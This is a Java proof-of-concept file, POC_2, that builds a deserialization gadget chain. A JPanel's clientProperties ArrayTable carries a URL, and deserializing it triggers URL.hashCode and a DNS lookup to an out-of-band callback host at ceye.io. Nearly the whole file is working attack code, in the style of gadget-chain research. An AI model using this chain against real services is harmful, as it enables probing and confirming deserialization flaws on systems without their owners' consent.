package com.example.JDK;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import javax.swing.*;
import java.net.URL;

public class POC_2 {

    /*** run with jComponent_hashCode.jar
     * <javax.swing.JComponent: void readObject(java.io.ObjectInputStream)>
     * <javax.swing.ArrayTable: void put(java.lang.Object,java.lang.Object)>
     * <javax.swing.ArrayTable: void grow()>
     * <java.util.Hashtable: void put(java.lang.Object,java.lang.Object)>
     * <java.net.URL: int hashCode()>
     * <java.net.URLStreamHandler: int hashCode(java.net.URL)>
     * <java.net.URLStreamHandler: java.net.InetAddress getHostAddress(java.net.URL)>
     * <java.net.InetAddress: java.net.InetAddress getByName(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        URL url = new URL("http://k2nlbt.ceye.io");
        ReflectionUtil.setField(url,"hashCode",1);

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[16];
        for (int i = 0; i < 16; i += 2) {
            table[i] = i == 14 ? url : "key" + i;
            table[i + 1] = "value" + i;
        }

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        ReflectionUtil.setField(url,"hashCode",-1);
        SerializeUtil.deserialize(SerializeUtil.serialize(j));

        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }
}
